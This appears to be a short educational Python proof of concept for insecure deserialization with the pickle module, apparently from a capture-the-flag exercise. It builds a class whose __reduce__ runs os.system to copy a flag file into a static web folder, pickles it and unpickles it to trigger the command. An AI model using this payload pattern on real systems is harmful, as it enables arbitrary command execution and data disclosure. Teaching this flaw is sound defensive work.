############################################
#example of unsafe de-serialization
import pickle
import os

#1. creating a Evil class which has our malicious payload command (‘whoami’)
class MyEvilPickle(object):
  def __reduce__(self):
    return (os.system, ('type pickleflag.txt > ./static/secretflaglocation.txt', ))

#2. serializing the malicious class
pickle_data = pickle.dumps(MyEvilPickle())
#storing the serialized output into a file in current directory
with open("pickle.data", "wb") as file:
  file.write(pickle_data)

#3. reading the malicious serialized data and de-serializing it
with open("pickle.data", "rb") as file:
  pickle_data = file.read()
  my_data = pickle.loads(pickle_data)

#https://medium.com/@abhishek.dev.kumar.94/sour-pickle-insecure-deserialization-with-python-pickle-module-efa812c0d565

#https://medium.com/better-programming/pickling-machine-learning-models-aeb474bc2d78
